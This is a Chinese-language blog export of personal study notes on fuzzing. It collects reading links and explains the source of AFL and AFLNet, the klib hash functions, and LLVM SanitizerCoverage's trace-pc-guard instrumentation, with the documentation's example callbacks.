<p><a href="https://paper.seebug.org/841/">https://paper.seebug.org/841/</a></p>
<p><a href="https://paper.seebug.org/842/#2-basic-block">https://paper.seebug.org/842/#2-basic-block</a></p>
<hr>
<p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a> ⭐</p>
<hr>
<p><a href="https://xz.aliyun.com/t/10316">https://xz.aliyun.com/t/10316</a></p>
<hr>
<p>跳跳糖–AFL</p>
<p><a href="https://tttang.com/user/f1tao">https://tttang.com/user/f1tao</a></p>
<p><a href="https://tttang.com/archive/1595/#toc__5">https://tttang.com/archive/1595/#toc__5</a></p>
<hr>
<p>Seebug</p>
<p><a href="https://paper.seebug.org/1732/">https://paper.seebug.org/1732/</a></p>
<hr>
<p>CSDN</p>
<p><a href="https://blog.csdn.net/m0_37907383/article/details/105419989">https://blog.csdn.net/m0_37907383/article/details/105419989</a></p>
<hr>
<p>IoTsec-Zone⭐</p>
<p>有毒师傅</p>
<p><a href="https://www.iotsec-zone.com/article?id=274">https://www.iotsec-zone.com/article?id=274</a></p>
<p><a href="https://www.iotsec-zone.com/article?id=249">https://www.iotsec-zone.com/article?id=249</a></p>
<hr>
<p>使用afl对libmodbus进行fuzz</p>
<p><a href="https://blog.csdn.net/qq_42768012/article/details/118567601">https://blog.csdn.net/qq_42768012/article/details/118567601</a></p>
<h2 id="2-AFLNET"><a href="#2-AFLNET" class="headerlink" title="2. AFLNET"></a>2. AFLNET</h2><p>AFLNET源码分析1</p>
<p><a href="https://blog.csdn.net/m0_50819561/article/details/129326221">https://blog.csdn.net/m0_50819561/article/details/129326221</a></p>
<p><a href="https://blog.csdn.net/m0_50819561/article/details/129905278">https://blog.csdn.net/m0_50819561/article/details/129905278</a></p>
<p><a href="https://blog.csdn.net/m0_50819561/article/details/129704417">https://blog.csdn.net/m0_50819561/article/details/129704417</a></p>
<hr>
<p>AFLNET源码分析2</p>
<p><a href="https://blog.csdn.net/von_Neumann_/article/details/127768296">https://blog.csdn.net/von_Neumann_/article/details/127768296</a></p>
<p><a href="https://blog.csdn.net/von_neumann_/category_12095073.html">https://blog.csdn.net/von_neumann_/category_12095073.html</a></p>
<hr>
<p>AFLNET源码分析3</p>
<p><a href="https://bbs.kanxue.com/thread-276269.htm">https://bbs.kanxue.com/thread-276269.htm</a></p>
<p>FuzzWiki–AFLNET</p>
<p><a href="https://mp.weixin.qq.com/s/cVWIeg6rVjtlmceT1fizAA">https://mp.weixin.qq.com/s/cVWIeg6rVjtlmceT1fizAA</a></p>
<h2 id="3-libFuzzer"><a href="#3-libFuzzer" class="headerlink" title="3. libFuzzer"></a>3. libFuzzer</h2><p>覆盖率统计工具SanitizerCoverage</p>
<p><a href="https://clang.llvm.org/docs/SanitizerCoverage.html#tracing-control-flow">https://clang.llvm.org/docs/SanitizerCoverage.html#tracing-control-flow</a></p>
<p>官方说明</p>
<p><a href="https://llvm.org/docs/LibFuzzer.html#getting-started">https://llvm.org/docs/LibFuzzer.html#getting-started</a></p>
<p>谷歌tutorial：<a href="https://github.com/google/fuzzing/blob/master/tutorial/libFuzzerTutorial.md">https://github.com/google/fuzzing/blob/master/tutorial/libFuzzerTutorial.md</a></p>
<p>libfuzzer-workshop:<a href="https://github.com/Dor1s/libfuzzer-workshop">https://github.com/Dor1s/libfuzzer-workshop</a></p>
<p>项目地址：</p>
<p><a href="https://github.com/llvm/llvm-project/tree/main/compiler-rt/lib/fuzzer">https://github.com/llvm/llvm-project/tree/main/compiler-rt/lib/fuzzer</a></p>
<hr>
<p>技术博客</p>
<p><a href="https://blog.csdn.net/weixin_42733202/article/details/119715246">https://blog.csdn.net/weixin_42733202/article/details/119715246</a></p>
<p><a href="https://bbs.kanxue.com/thread-274792.htm">https://bbs.kanxue.com/thread-274792.htm</a></p>
<p><a href="https://blog.csdn.net/Alicheche/article/details/127266732">https://blog.csdn.net/Alicheche/article/details/127266732</a></p>
<p>libfuzzer编译链接：<a href="https://i-m.dev/posts/20190831-143715.html">https://i-m.dev/posts/20190831-143715.html</a></p>
<p>libfuzzer和LLVM：<a href="https://p1umer.github.io/2019/02/20/libfuzzer%20&%20LLVM%20%E5%88%9D%E6%8E%A2/">https://p1umer.github.io/2019/02/20/libfuzzer%20&amp;%20LLVM%20%E5%88%9D%E6%8E%A2/</a></p>
<h2 id="4-SantisizeCoverage"><a href="#4-SantisizeCoverage" class="headerlink" title="4. SantisizeCoverage"></a>4. SantisizeCoverage</h2><p><a href="https://github.com/lcatro/Source-and-Fuzzing/tree/master">https://github.com/lcatro/Source-and-Fuzzing/tree/master</a></p>
<p>低版本：<a href="https://bcain-llvm.readthedocs.io/projects/clang/en/latest/SanitizerCoverage/">https://bcain-llvm.readthedocs.io/projects/clang/en/latest/SanitizerCoverage/</a></p>
<p><a href="https://blog.csdn.net/yuanbinquan/article/details/106767635">https://blog.csdn.net/yuanbinquan/article/details/106767635</a></p>
<h2 id="个人博客网站"><a href="#个人博客网站" class="headerlink" title="个人博客网站"></a>个人博客网站</h2><p><a href="https://myfzy.top/2021/03/16/symcc+afl/">https://myfzy.top/2021/03/16/symcc+afl/</a></p>
<p><a href="https://myfzy.top/">https://myfzy.top/</a></p>
<p><a href="https://blog.csdn.net/Alicheche?type=blog">https://blog.csdn.net/Alicheche?type=blog</a></p>
<p>软件测试：<a href="https://swen90006.github.io/notes/intro.html">https://swen90006.github.io/notes/intro.html</a></p>
<p>libfuzzer源码：<a href="https://github.com/llvm-mirror/compiler-rt/tree/master/lib/fuzzer">https://github.com/llvm-mirror/compiler-rt/tree/master/lib/fuzzer</a></p>
<p>clang：<a href="http://www.helloted.com/ios/2020/06/28/clang/">http://www.helloted.com/ios/2020/06/28/clang/</a></p>
<h1 id="陈老师提供的学习网站"><a href="#陈老师提供的学习网站" class="headerlink" title="陈老师提供的学习网站"></a>陈老师提供的学习网站</h1><p>libfuzzer采用路径覆盖率（afl采用边覆盖率）：<a href="https://llvm.org/docs/LibFuzzer.html#getting-started">https://llvm.org/docs/LibFuzzer.html#getting-started</a></p>
<p>“If a mutation triggers execution of a previously-uncovered path in the code under test, then that mutation is saved to the corpus for future variations.”</p>
<p>看看能不能把libfuzzer的路径覆盖率采集模块摘下来。</p>
<p>或者使用这个工具来记录控制流（需要确认一下这里的控制流是不是体现的路径覆盖率）：<br><a href="https://clang.llvm.org/docs/SanitizerCoverage.html#id10">https://clang.llvm.org/docs/SanitizerCoverage.html#id10</a></p>
<p>作为路径覆盖率。</p>
<p>afl用于fuzz协议软件：<a href="https://www.cnblogs.com/hac425/p/9416917.html">https://www.cnblogs.com/hac425/p/9416917.html</a></p>
<p>这个模块提供了一个python包装器用于与fuzze（例如AFL）进行交互：<a href="https://github.com/angr/phuzzer">https://github.com/angr/phuzzer</a></p>
<p>This module provides a Python wrapper for interacting with fuzzers, such as AFL (American Fuzzy Lop: <a href="http://lcamtuf.coredump.cx/afl/">http://lcamtuf.coredump.cx/afl/</a>). It supports starting an AFL instance, adding slave workers, injecting and retrieving testcases, and checking various performance metrics.</p>
<p>boofuzz源码笔记</p>
<p><a href="https://www.iotsec-zone.com/article?id=322">https://www.iotsec-zone.com/article?id=322</a></p>
<p>fuzz101实践</p>
<p><a href="https://www.iotsec-zone.com/article?id=245">https://www.iotsec-zone.com/article?id=245</a></p>
<hr>
<p><strong>Fuzzing-Like-A-Caveman</strong>中文翻译</p>
<p>第一篇：<a href="https://www.anquanke.com/post/id/202982">https://www.anquanke.com/post/id/202982</a></p>
<p>第二篇：<a href="https://www.anquanke.com/post/id/202989">https://www.anquanke.com/post/id/202989</a></p>
<p>第三篇：<a href="https://www.anquanke.com/post/id/207307">https://www.anquanke.com/post/id/207307</a></p>
<p>第四篇：<a href="https://www.anquanke.com/post/id/234437">https://www.anquanke.com/post/id/234437</a></p>
<p>第五篇：<a href="https://www.anquanke.com/post/id/234551#h2-0">https://www.anquanke.com/post/id/234551#h2-0</a></p>
]]></content>
      <categories>
        <category>FUZZ</category>
      </categories>
  </entry>
  <entry>
    <title>Fuzz源码理解</title>
    <url>/2023/07/06/Fuzz/Fuzz%E6%BA%90%E7%A0%81%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<p>关于 AFL 与 AFLNet 中对代码功能的一些理解，未完。</p>
<span id="more"></span>

<h1 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h1><p><code>run_target</code>函数功能</p>
<p>首先将<code>tarce_bits</code>置0，用于记录本次运行的命中的路径及其数量，然后进行pipe设置执行程序，在之后对<code>tarce_bits</code>进行规整，搜集信息，判断返回状态并返回。</p>
<p><code>top_rated[]</code>结构体数组，<code>top_rated[i]</code>是一个结构体，包含了关于第 i 个测试用例的覆盖率和评分情况。</p>
<p>这里的i表示的是每一条路径，top_rated[i]的意思是对于当前这条路径 i，top_rated[i]位置指向的测试用例是最优的一个</p>
<hr>
<p>判断条件的理解：</p>
<p><code>MAP_SIZE</code>大小为 65535 .表示路径数。<code>MAP_SIZE&gt;&gt;3</code> 表示按8个路径为一组进行划分，每 1 bit代表一条路径，所以需要<code>MAP_SIZE&gt;&gt;3</code>个byte来存储这些路径，每 1 byte存储8条路径。</p>
<p><code>(i&amp;7)</code> 相当于是 <code>i</code>对 7 取模，相当于 i 除以 8 的余数，写成位来看就比较好理解了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设i从0到8</span><br><span class="line">i = 0 :</span><br><span class="line">   000     i</span><br><span class="line">&amp;  111     7</span><br><span class="line">------------</span><br><span class="line">   000     0</span><br><span class="line"></span><br><span class="line">i = 1 :</span><br><span class="line">   001     i</span><br><span class="line">&amp;  111     7</span><br><span class="line">------------</span><br><span class="line">   00      1</span><br><span class="line">   ···</span><br><span class="line">i = 8 :</span><br><span class="line">   1000     i</span><br><span class="line">&amp;  0111     7</span><br><span class="line">------------</span><br><span class="line">   0000     0</span><br></pre></td></tr></table></figure>

<p>因为 <code>MAP_SIZE&gt;&gt;3</code>后，每 1 bit来表示一条路径，所以在对每个字节的检查中，需要检查的是各个位的位置，范围是0到7之间。</p>
<p><code>1&lt;&lt;(i&amp;7)</code>也就是，1分别左移0，1，2，3，···，7位，同样，换成位来看：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i = 0: 1&lt;&lt;0 00000001 </span><br><span class="line">i = 1: 1&lt;&lt;1 00000010</span><br><span class="line">i = 2: 1&lt;&lt;2 00000100</span><br><span class="line">i = 3: 1&lt;&lt;3 00001000</span><br><span class="line">···</span><br><span class="line">i = 7: 1&lt;&lt;7 10000000</span><br></pre></td></tr></table></figure>

<p>这样就是依次检查该字节的各个位（bit）的情况</p>
<p><code>calibrate_case</code>函数中调用到的关键函数和主要流程：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">calibrate_case()&#123;</span><br><span class="line">	init_forkserver();</span><br><span class="line">	<span class="keyword">for</span>()&#123;</span><br><span class="line">        write_to_testcase();<span class="comment">//写入.cur_input</span></span><br><span class="line"></span><br><span class="line">        run_target();</span><br><span class="line"></span><br><span class="line">        判断hash得到的cksum&#123;</span><br><span class="line">            has_new_bits();</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	update_bitmap_score()；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>run_target</code>函数关键流程：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">run_target()&#123;</span><br><span class="line">	</span><br><span class="line">    <span class="built_in">memset</span>(trace_bits, <span class="number">0</span>, MAP_SIZE);</span><br><span class="line">    </span><br><span class="line">    对pipe进行设置;</span><br><span class="line">    </span><br><span class="line">    通知forkserver执行程序,j或调用execvp执行程序;</span><br><span class="line">    </span><br><span class="line">    classify_counts();对tarce_bits进行规整</span><br><span class="line">    </span><br><span class="line">    判断程序执行结果，返回对应的错误值;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>common_fuzz_stuff</code>函数中调用的关键函数和主要流程：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">common_fuzz_stuff()&#123;</span><br><span class="line">	</span><br><span class="line">	write_to_testcase(out_buf, len);</span><br><span class="line">	</span><br><span class="line">	fault = run_target(argv, exec_tmout);</span><br><span class="line">	</span><br><span class="line">	save_if_interesting(out_buf, len, fault);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>save_if_interesting</code>函数中调用的关键函数和主要流程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">save_if_interesting()&#123;</span><br><span class="line">	if(!has_new_bits)&#123;</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	add_to_queue();</span><br><span class="line">	</span><br><span class="line">	fault = calibrate_case();</span><br><span class="line">	</span><br><span class="line">	保存到本地文件;</span><br><span class="line">	</span><br><span class="line">	switch(fault)&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>下面是次一级重要的函数：</p>
<p><code>trim_case</code>函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h2><p>1.关于forkserver插桩的代码部分：在第一次执行桩代码时的，__afl_fork_wait_loop这个函数内，会不断执行fork？还是只执行一次，这个循环是什么？<br>对于每一个测试用例，或重新fork一次？还是重新execvp一次？<br>答：对于每一个测试用例会重新fork一次，生成一个新的子进程，如果未设置forkserver则会重新execvp（）</p>
<p>2.forkserver，父子进程进行通信，通信的内容是什么？<br>写入管道内的__afl_temp 4字节大小的信息是什么？</p>
<p>3.如何给进程传递testcase中的输入？<br>答：在试运行过程中，通过read函数读取文件内容到use_mem变量中，然后作为参数传递给calibrate_case函数<br>追问：在calibrate_case函数内，通过write_to_testcase函数将文件内容use_mem写入到out_file(.cur_input)文件，但是fork得到的进程如何获取输入，在源码哪里体现出来？</p>
<p>4.resume模式，多次提到的resuming_fuzz变量</p>
<p>5.跟踪字节引用计数，tc_ref变量的作用</p>
<ol start="6">
<li>extras的作用</li>
</ol>
<p>7.timeout_given，超时时间是谁的超时时间？<br>答：target程序运行的超时时间</p>
<p>8.cur_depth，max_depth，和q-&gt;depth，这些变量里的depth指的是什么？如何理解？</p>
<p>9.路径数，是不是应该叫测试用例数更符合，这里的path理解成路径的话，这个路径是指的什么路径？</p>
<p>10：q-&gt;handicap这个变量的作用？</p>
<p>几个模块：反馈收集、种子筛选、种子变异、种子调度。</p>
<h1 id="AFLNET"><a href="#AFLNET" class="headerlink" title="AFLNET"></a>AFLNET</h1><h2 id="源码理解"><a href="#源码理解" class="headerlink" title="源码理解"></a>源码理解</h2><p>AFLNET主要在AFL的基础上实现了：</p>
<ol>
<li>socket 通信发送测试用例</li>
<li>一套与代码覆盖率并行的状态机引导机制</li>
<li>增加了消息序列级别的变异策略</li>
</ol>
<h2 id="klib库"><a href="#klib库" class="headerlink" title="klib库"></a>klib库</h2><h3 id="khint-t"><a href="#khint-t" class="headerlink" title="khint_t"></a><code>khint_t</code></h3><p>在 klib 库中，<code>khint_t</code> 是一个无符号整数类型，用于表示哈希表中的键、值和哈希函数的返回值等。</p>
<p><code>khint_t</code> 的实现可能会因不同的编译器和平台而异，通常会被定义为 <code>size_t</code> 或 <code>unsigned int</code>。在 klib 库中，<code>khint_t</code> 通常用于表示哈希表中键值对的索引或哈希值，它是哈希表中的关键类型之一。</p>
<p>例如，在使用 klib 库中的哈希表时，可以使用 <code>khint_t</code> 类型来表示键、值和哈希函数的返回值。在向哈希表中添加、删除、查找或更新键值对时，需要使用 <code>khint_t</code> 类型来指定相应的操作。<code>khint_t</code> 可以保证足够大，以便在大多数哈希表中存储索引或哈希值。</p>
<h3 id="kh-get"><a href="#kh-get" class="headerlink" title="kh_get()"></a><code>kh_get()</code></h3><p><code>kh_get</code> 是 klib 库中哈希表操作的一个函数之一，用于获取指定键的值。</p>
<p>该函数的原型为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">khint_t</span> <span class="title function_">kh_get</span><span class="params">(<span class="type">kh_t</span>, <span class="type">khkey_t</span> key)</span>;</span><br></pre></td></tr></table></figure>

<p>其中，<code>kh_t</code> 表示哈希表的类型，<code>khkey_t</code> 表示键的类型，<code>khint_t</code> 表示哈希表索引的类型。该函数的返回值为哈希表中与指定键相关联的索引，如果指定键不存在，则返回哈希表的结束位置。</p>
<p><code>kh_get</code> 函数的作用是从哈希表中查找指定键的值，并返回该键对应的索引。在哈希表中，每个键都会被哈希成一个索引，而该索引通常用于查找存储在哈希表中的值。<code>kh_get</code> 函数通过查找指定键的索引来获取该键对应的值。</p>
<h3 id="kh-end"><a href="#kh-end" class="headerlink" title="kh_end()"></a><code>kh_end()</code></h3><p><code>kh_end</code> 是 klib 库中哈希表操作的一个函数之一，用于获取哈希表的结束位置。</p>
<p>该函数的原型为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">khint_t kh_end(kh_t);</span><br></pre></td></tr></table></figure>

<p>其中，<code>kh_t</code> 表示哈希表的类型，<code>khint_t</code> 表示哈希表索引的类型。该函数的返回值为哈希表的结束位置，即哈希表中最后一个键值对的后一个位置。</p>
<p><code>kh_end</code> 函数的作用是获取哈希表中最后一个键值对的后一个位置。在 klib 库中，哈希表中的键值对是按照哈希值存储的，而哈希表的大小通常是事先确定的。因此，可以通过 <code>kh_end</code> 函数来获取哈希表的结束位置，并遍历哈希表中的所有键值对。</p>
<h3 id="kh-val"><a href="#kh-val" class="headerlink" title="kh_val()"></a><code>kh_val()</code></h3><p><code>kh_val</code> 是 klib 库中哈希表操作的一个函数之一，用于获取与指定索引相关联的值。</p>
<p>该函数的原型为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">khval_t kh_val(kh_t, khint_t);</span><br></pre></td></tr></table></figure>

<p>其中，<code>kh_t</code> 表示哈希表的类型，<code>khint_t</code> 表示哈希表索引的类型，<code>khval_t</code> 表示值的类型。该函数的返回值为与指定索引相关联的值。</p>
<p><code>kh_val</code> 函数的作用是获取与指定索引相关联的值。在哈希表中，每个键都会被哈希成一个索引，而该索引通常用于查找存储在哈希表中的值。<code>kh_val</code> 函数通过指定索引来获取该索引对应的值。</p>
<h2 id="疑问-1"><a href="#疑问-1" class="headerlink" title="疑问"></a>疑问</h2><p>Target State Selector 目标状态选择器，什么是state？初始状态从哪里获取?</p>
<p>下一个状态？如何选择下一个状态？如何根据hash表存储状态并索引</p>
<p>send_over_network函数中最后HANDLE_REPONSES:为什么要 while（1）if {has_new_bits&#x3D;&#x3D;2} break;</p>
<p>种子的region是什么？</p>
<p>答：先看一下add_to_queue函数时，写入到文件保存下来的内容：</p>
<p>在save_regions_to_file函数中，每一个region格式为：<code>Region %d - Start: %d, End: %d\n</code></p>
<p>我们再来看下生成的文件的内容:</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230706204811073.png" alt="image-20230706204811073"></p>
<p>可以看到，rtsp_requests_aac.raw对应的regions的数量是3，即有三个region，</p>
<p>第一个region从0开始，在157（0x9D处结束）。</p>
<p>我们看一下rtsp_requests_aac.raw内容：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230706205049246.png" alt="image-20230706205049246"></p>
<p>红色竖线刚好是0x9D的位置，我们可以看到，region的起止范围正好是第一条请求的全部内容</p>
<p>所以，regions就是该种子中请求的数量，一个region对应一个请求</p>
<p>was_fuzzed_map二维数组是如何标记states和qentries的</p>
<p>qentries又指的是states里的什么？</p>
<p>这里的states的seed指的是什么，kl_message</p>
]]></content>
      <categories>
        <category>FUZZ</category>
      </categories>
  </entry>
  <entry>
    <title>SanitizeCoverage学习</title>
    <url>/2023/08/17/Fuzz/SanitizeCoverage%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="SanitizerCoverage官方文档翻译"><a href="#SanitizerCoverage官方文档翻译" class="headerlink" title="SanitizerCoverage官方文档翻译"></a>SanitizerCoverage官方文档翻译</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>LLVM内置了一个简单的代码覆盖率插桩工具（SanitizerCoverage）。它在函数、基本块和边界级别上插入对用户定义函数的调用。提供了这些回调的默认实现，用于简单的覆盖率报告和可视化。然而，如果您只需要覆盖率的可视化，可能更适合使用SourceBasedCodeCoverage。</p>
<span id="more"></span>

<h3 id="Tracing-PCs-with-guards"><a href="#Tracing-PCs-with-guards" class="headerlink" title="Tracing PCs with guards"></a>Tracing PCs with guards</h3><p>通过<code>-fsanitize-coverage=trace-pc-guard</code>设置，编译器将会在每一条边edge插入下面的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__sanitizer_cov_trace_pc_guard(&amp;guard_variable)</span><br></pre></td></tr></table></figure>

<p>每一条边edge有他自己的 <em>guard_variable(uint32_t)</em></p>
<p>编译器还将插入对模块构造函数的调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The guards are [start, stop).</span></span><br><span class="line"><span class="comment">// This function will be called at least once per DSO and may be called</span></span><br><span class="line"><span class="comment">// more than once with the same values of start/stop.</span></span><br><span class="line">__sanitizer_cov_trace_pc_guard_init(<span class="type">uint32_t</span> *start, <span class="type">uint32_t</span> *stop);</span><br></pre></td></tr></table></figure>

<p>通过额外的flag设置  <code>...=trace-pc,indirect-calls</code> ，<code>__sanitizer_cov_trace_pc_indirect(void *callee)</code>函数将会在每一个间接调用时插入。</p>
<p>下列函数  <code>__sanitizer_cov_trace_pc_*</code> 应该由用户定义。</p>
<p>Example：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// trace-pc-guard-cb.cc</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sanitizer/coverage_interface.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This callback is inserted by the compiler as a module constructor</span></span><br><span class="line"><span class="comment">// into every DSO. &#x27;start&#x27; and &#x27;stop&#x27; correspond to the</span></span><br><span class="line"><span class="comment">// beginning and end of the section with the guards for the entire</span></span><br><span class="line"><span class="comment">// binary (executable or DSO). The callback will be called at least</span></span><br><span class="line"><span class="comment">// once per DSO and may be called multiple times with the same parameters.</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> __sanitizer_cov_trace_pc_guard_init(<span class="type">uint32_t</span> *start,</span><br><span class="line">                                                    <span class="type">uint32_t</span> *stop) &#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">uint64_t</span> N;  <span class="comment">// Counter for the guards.</span></span><br><span class="line">  <span class="keyword">if</span> (start == stop || *start) <span class="keyword">return</span>;  <span class="comment">// Initialize only once.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;INIT: %p %p\n&quot;</span>, start, stop);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">uint32_t</span> *x = start; x &lt; stop; x++)</span><br><span class="line">    *x = ++N;  <span class="comment">// Guards should start from 1.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This callback is inserted by the compiler on every edge in the</span></span><br><span class="line"><span class="comment">// control flow (some optimizations apply).</span></span><br><span class="line"><span class="comment">// Typically, the compiler will emit the code like this:</span></span><br><span class="line"><span class="comment">//    if(*guard)</span></span><br><span class="line"><span class="comment">//      __sanitizer_cov_trace_pc_guard(guard);</span></span><br><span class="line"><span class="comment">// But for large functions it will emit a simple call:</span></span><br><span class="line"><span class="comment">//    __sanitizer_cov_trace_pc_guard(guard);</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> __sanitizer_cov_trace_pc_guard(<span class="type">uint32_t</span> *guard) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!*guard) <span class="keyword">return</span>;  <span class="comment">// Duplicate the guard check.</span></span><br><span class="line">  <span class="comment">// If you set *guard to 0 this code will not be called again for this edge.</span></span><br><span class="line">  <span class="comment">// Now you can get the PC and do whatever you want:</span></span><br><span class="line">  <span class="comment">//   store it somewhere or symbolize it and print right away.</span></span><br><span class="line">  <span class="comment">// The values of `*guard` are as you set them in</span></span><br><span class="line">  <span class="comment">// __sanitizer_cov_trace_pc_guard_init and so you can make them consecutive</span></span><br><span class="line">  <span class="comment">// and use them to dereference an array or a bit vector.</span></span><br><span class="line">  <span class="type">void</span> *PC = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line">  <span class="type">char</span> PcDescr[<span class="number">1024</span>];</span><br><span class="line">  <span class="comment">// This function is a part of the sanitizer run-time.</span></span><br><span class="line">  <span class="comment">// To use it, link with AddressSanitizer or other sanitizer.</span></span><br><span class="line">  __sanitizer_symbolize_pc(PC, <span class="string">&quot;%p %F %L&quot;</span>, PcDescr, <span class="keyword">sizeof</span>(PcDescr));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;guard: %p %x PC %s\n&quot;</span>, guard, *guard, PcDescr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h2><h3 id="1-SanitizeCoverage中，Tracing-PCs-with-guards是什么意思，作用是什么？"><a href="#1-SanitizeCoverage中，Tracing-PCs-with-guards是什么意思，作用是什么？" class="headerlink" title="1. SanitizeCoverage中，Tracing PCs with guards是什么意思，作用是什么？"></a>1. <strong>SanitizeCoverage中，Tracing PCs with guards是什么意思，作用是什么？</strong></h3><p>答：在SanitizeCoverage中，”Tracing PCs with guards”是指通过对程序中的特定代码块进行跟踪，并在其执行路径上添加条件检查来实现代码覆盖率的收集。</p>
<p>作用是为了确定测试用例是否能够触发程序中的所有代码路径。当程序中存在条件分支、循环或其他控制结构时，使用条件检查可以追踪和记录每个可能的执行路径。这样做可以帮助开发人员识别未被覆盖的代码区域，从而进行调试、优化和改进代码。</p>
<p>具体来说，”Tracing PCs with guards”的过程涉及以下步骤：</p>
<ol>
<li>选择一个代码块（通常是函数或方法）作为目标。</li>
<li>在代码块的入口处插入条件检查。</li>
<li>当满足条件时，记录该代码块的执行路径。</li>
<li>在执行路径中的每个条件分支点，重复步骤2-3直到覆盖所有可能的执行路径。</li>
<li>收集并分析代码覆盖率信息，以确定哪些路径已经被触发，哪些还没有。</li>
</ol>
<p>通过”Tracing PCs with guards”的技术，开发人员可以更全面地了解他们的代码在不同输入下的行为，从而提高软件的质量和可靠性。</p>
<h3 id="2-guard是什么，-guard是什么？"><a href="#2-guard是什么，-guard是什么？" class="headerlink" title="2. guard是什么，*guard是什么？"></a>2. <strong>guard是什么，*guard是什么？</strong></h3><p>答：</p>
<p>guard指的是guard变量的地址，大小为32bit。其实插桩相当于是给每一个基本块（或边，根据细粒度具体来说）分配一个guard变量，每一个guard变量存储其对应的基本块的ID值。当执行该基本块时，调用__sanitizer_cov_trace_pc_guard函数，通过传入guard参数来识别当前是在处理哪一个基本块。</p>
<p>*guard 里存储的是插桩函数__sanitizer_cov_trace_pc_guard的ID序号，根据源代码中的基本块顺序来分配，验证如下：</p>
<p>以LLVM官网文档中的例子举例，对于以下代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) foo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译执行后结果如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230711151728638.png" alt="image-20230711151728638"></p>
<p>将代码做下简单修改：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">foo2</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) foo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230711151942269.png" alt="image-20230711151942269"></p>
<p>可以看到，中间新添加了一个函数，除了第三行仍然是1之外，前两行的值都 +1，可以说明我们插入了一个函数导致main函数中基本块位置后移1位，所以ID值加1。</p>
<h3 id="3-start和stop如何理解？-start-stop"><a href="#3-start和stop如何理解？-start-stop" class="headerlink" title="3. start和stop如何理解？[start,stop)"></a>3. start和stop如何理解？[start,stop)</h3><p>答：以LLVM官方文档中的tarce-pc-guard中的例子为例，按照命令编译执行后得到结果如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230711152954140.png" alt="image-20230711152954140"></p>
<p>根据结果可以看到 start 为 0x6f9c70 , stop 为 0x6f9c80 。</p>
<p>start所指的地址正好是结果中最后一行，foo() 函数中 插入的插桩函数的地址，并且guard的ID值刚好为1。</p>
